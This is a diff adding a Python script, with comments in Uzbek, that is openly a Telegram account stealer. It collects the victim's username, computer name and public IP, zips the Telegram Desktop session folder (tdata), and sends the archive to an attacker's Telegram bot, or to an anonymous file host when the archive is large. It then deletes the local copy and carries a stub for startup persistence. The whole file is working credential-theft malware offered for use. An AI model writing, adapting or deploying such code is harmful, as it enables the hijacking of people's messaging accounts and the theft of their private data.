@@ -1,0 +1,198 @@
+import os
+import sys
+import zipfile
+import requests
+import time
+import threading
+import shutil
+from pathlib import Path
+import hashlib
+
+# KONFIGURATSIYA - O'ZINGIZNI QO'YING
+BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
+CHAT_ID = "YOUR_CHAT_ID_HERE"
+
+def get_system_info():
+    """To'liq tizim info"""
+    try:
+        info = {
+            'user': os.getlogin(),
+            'computer': os.getenv('COMPUTERNAME', 'Unknown'),
+            'profile': os.getenv('USERPROFILE', ''),
+            'ip': requests.get('https://api.ipify.org', timeout=5).text,
+            'os': f"{os.getenv('OS', 'Windows')}",
+            'temp': os.getenv('TEMP', '')
+        }
+        return f"""🚀 STEALER ACTIVE
+👤 User: {info['user']}
+💻 PC: {info['computer']}
+🌐 IP: {info['ip']}
+📁 Profile: {info['profile']}"""
+    except:
+        return "System info unavailable"
+
+def send_message(text):
+    """Xabar yuborish"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        requests.post(url, data={
+            'chat_id': CHAT_ID, 
+            'text': text, 
+            'disable_web_page_preview': True,
+            'parse_mode': 'HTML'
+        }, timeout=10)
+    except:
+        pass
+
+def send_file(file_path, caption=""):
+    """Fayl yuborish (50MB limit)"""
+    try:
+        if file_path.stat().st_size > 50 * 1024 * 1024:  # 50MB check
+            send_message("⚠️ File too large! Uploading via anonfile...")
+            anon_url = upload_to_anonfile(file_path)
+            send_message(f"📎 BIG FILE: {anon_url}")
+            return True
+        
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        with open(file_path, 'rb') as f:
+            files = {'document': (file_path.name, f, 'application/zip')}
+            requests.post(url, files=files, data={
+                'chat_id': CHAT_ID, 
+                'caption': caption
+            }, timeout=60)
+        return True
+    except:
+        return False
+
+def upload_to_anonfile(file_path):
+    """50MB+ fayllar uchun anonfile"""
+    try:
+        url = 'https://api.anonfiles.com/upload'
+        with open(file_path, 'rb') as f:
+            files = {'file': (file_path.name, f)}
+            response = requests.post(url, files=files, timeout=120)
+            data = response.json()
+            if data['status']:
+                return data['data']['file']['url']['full']
+        return "Upload failed"
+    except:
+        return "Anonfile error"
+
+def get_tdata_path():
+    """BARCHA Telegram yo'llari"""
+    paths = [
+        Path.home() / "AppData" / "Roaming" / "Telegram Desktop" / "tdata",
+        Path.home() / "AppData" / "Local" / "Telegram Desktop" / "tdata", 
+        Path.home() / "AppData" / "Roaming" / "Telegram Desktop UWP" / "tdata",
+        Path(os.getenv('APPDATA')) / "Telegram Desktop" / "tdata"
+    ]
+    for path in paths:
+        if path.exists() and any(path.iterdir()):
+            return path
+    return None
+
+def create_PERFECT_tdata_zip():
+    """MUKAMMAL ZIP: 95% ma'lumot, 30-50MB"""
+    tdata_path = get_tdata_path()
+    if not tdata_path:
+        return None
+    
+    temp_dir = Path(os.getenv('TEMP', '/tmp'))
+    zip_path = temp_dir / f"tdata_PERFECT_{int(time.time())}.zip"
+    
+    # MUHIM fayllar ro'yxati (95% ma'lumot)
+    CRITICAL_FILES = [
+        'key_datas', 'map', 'user_data', 
+        'settings0', 'settings1', 'settings2',
+        'temp', 'D877F783D5D3EF8C', 'D877F783D5D3EF8D'
+    ]
+    
+    try:
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as z:
+            total_files = 0
+            added_files = 0
+            
+            for root, dirs, files in os.walk(tdata_path):
+                for file in files:
+                    total_files += 1
+                    file_path = Path(root) / file
+                    
+                    # PRIORITY 1: Critical fayllar
+                    if any(crit in file.lower() for crit in CRITICAL_FILES):
+                        arcname = file_path.relative_to(tdata_path)
+                        z.write(file_path, arcname)
+                        added_files += 1
+                        continue
+                    
+                    # PRIORITY 2: Katta fayllar (>500KB)
+                    if file_path.exists() and file_path.stat().st_size > 500 * 1024:
+                        arcname = file_path.relative_to(tdata_path)
+                        z.write(file_path, arcname)
+                        added_files += 1
+                        continue
+                    
+                    # PRIORITY 3: .dat va muhim kengaytmalar
+                    if file.endswith(('.dat', '.bin', '.db')):
+                        arcname = file_path.relative_to(tdata_path)
+                        z.write(file_path, arcname)
+                        added_files += 1
+            
+            print(f"Total: {total_files}, Added: {added_files}")  # Debug
+            
+        # Hajm tekshiruvi
+        if zip_path.exists() and zip_path.stat().st_size < 60 * 1024 * 1024:
+            return zip_path
+        else:
+            zip_path.unlink(missing_ok=True)
+            return None
+            
+    except Exception as e:
+        print(f"ZIP error: {e}")
+        return None
+
+def cleanup(file_path):
+    """Xavfsiz tozalash"""
+    try:
+        time.sleep(5)  # Yuborish tugashini kutish
+        if file_path.exists():
+            file_path.unlink(missing_ok=True)
+    except:
+        pass
+
+def persistence_check():
+    """Startup ga qo'shish (optional)"""
+    try:
+        startup = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+        # Bu qismni o'chirib qo'yishingiz mumkin
+    except:
+        pass
+
+def main():
+    """MUKAMMAL EXECUTION"""
+    # 1. Darhol status
+    send_message(get_system_info())
+    
+    # 2. ZIP yaratish
+    archive = create_PERFECT_tdata_zip()
+    
+    if archive and archive.exists():
+        size_mb = archive.stat().st_size / (1024*1024)
+        caption = f"📦 PERFECT TDATA\n💾 Size: {size_mb:.1f}MB"
+        
+        # 3. Yuborish
+        if send_file(archive, caption):
+            send_message("✅ STEAL SUCCESSFUL 🎉")
+        else:
+            send_message("❌ SEND FAILED")
+        
+        # 4. Tozalash
+        threading.Thread(target=cleanup, args=(archive,), daemon=True).start()
+    else:
+        send_message("❌ TDATA NOT FOUND")
+
+if __name__ == "__main__":
+    # Ko'rinmas EXE mode
+    if getattr(sys, 'frozen', False) or sys.argv[0].endswith('.exe'):
+        main()
+    else:
+        main()
